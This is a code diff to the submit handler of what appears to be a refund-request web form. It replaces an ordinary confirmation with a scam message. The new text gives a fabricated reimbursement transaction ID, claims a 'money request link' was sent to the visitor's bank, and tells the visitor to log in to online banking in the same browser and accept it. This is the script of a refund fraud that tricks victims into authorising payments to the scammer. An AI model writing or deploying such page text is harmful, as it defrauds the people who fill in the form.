@@ -34,8 +34,14 @@ form.addEventListener("submit", async function (e) {
         message.className = "success";
         message.innerHTML = `
             <strong>✔ Refund Request Submitted Successfully!</strong><br><br>
-            Thank you for submitting your refund request.<br>
-            Our refund specialists will review your request shortly.
+           Your Reimbursement has been processed successfully.
+
+Your Reimbursement Transaction ID : 085-59250-159759-786420 .
+
+We Have Successfully Sent You A Money Request Link On Your Bank.
+
+Dear Customer, 
+                          Please verify and log in to your online banking on the same browser where you submitted your cancellation and refund form and accept the money request link to complete your transaction.<br>
         `;
 
         submitBtn.textContent = "Submitted ✓";
